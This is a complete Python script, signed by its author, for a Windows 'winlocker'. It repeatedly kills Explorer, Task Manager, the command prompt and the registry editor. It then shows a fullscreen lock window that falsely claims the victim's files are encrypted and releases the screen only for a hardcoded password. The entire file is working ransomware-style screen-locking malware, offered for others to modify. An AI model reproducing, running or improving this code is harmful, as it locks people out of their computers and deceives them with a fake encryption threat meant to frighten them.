from tkinter import *
from tkinter import messagebox
import subprocess
from time import sleep
import ctypes, sys
from PIL import ImageTk,Image
import os
os.system("taskkill /f /im  taskmgr.exe")

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
subprocess.call("taskkill /F /IM cmd.exe", startupinfo=si)
subprocess.call("taskkill /F /IM regedit.exe", startupinfo=si)

def btn_click():
	UserInput = ent.get()
	if UserInput == 'Ci3amu':
		messagebox.showinfo(title = 'SUCCESS', message = 'UNLOCKED\nPRESS Ok to continue...')
		root.destroy()
	else:
		messagebox.showwarning(title = 'ERROR', message = 'PASSWORD IS INCORRECT...')
		subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
		subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
		subprocess.call("taskkill /F /IM cmd.exe", startupinfo=si)
		subprocess.call("taskkill /F /IM regedit.exe", startupinfo=si)
def exits():
	if ent.get() != 'Ci3amu':
		messagebox.showwarning(title = 'ERROR', message = 'Oops... Your Files is encrypted.. You cannot unlock this window until you enter the password.')
		subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
		subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
		subprocess.call("taskkill /F /IM cmd.exe", startupinfo=si)
		subprocess.call("taskkill /F /IM regedit.exe", startupinfo=si)

subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
subprocess.call("taskkill /F /IM regedit.exe", startupinfo=si)
subprocess.call("taskkill /F /IM cmd.exe", startupinfo=si)
root = Tk()
root.title('Windows Locked!')
root.geometry('400x200')
root.attributes('-fullscreen', True)
image=Image.open("ransomware.jpg")
photo = ImageTk.PhotoImage(image)
lbl = Label(root,image=photo)
root['bg'] = 'black'
root.protocol('WM_DELETE_WINDOW', exits)
Label(root, text = 'Write Password: ', font = 'Arial 25', bg = 'black', fg = 'lime').pack()
ent = Entry(root, text = '', font = 'Arial 25',bg = 'black', fg = 'lime', width = 100)
ent.pack()
Button(root, text = 'UNLOCK', font = 'Arial 25', bg = 'black', fg = 'lime', command = btn_click).pack()
Label(root, text = 'The author of the program is not responsible for your actions! ', font = 'Arial 25', bg = 'black', fg = 'lime').pack()
Label(root, text = 'WINLOCKER CREATED BY CISAMU. ', font = 'Arial 25', bg = 'black', fg = 'lime').pack()
Label(root, text = '(c) 2022. ', font = 'Arial 25', bg = 'black', fg = 'lime').pack()
subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
subprocess.call("taskkill /F /IM cmd.exe", startupinfo=si)
subprocess.call("taskkill /F /IM regedit.exe", startupinfo=si)
lbl.pack(pady=0,padx=0)
root.mainloop()
#CREATED BY CISAMU (c) 2022
#all rights reserved
#If you want to modify this project, please tag me under your modification.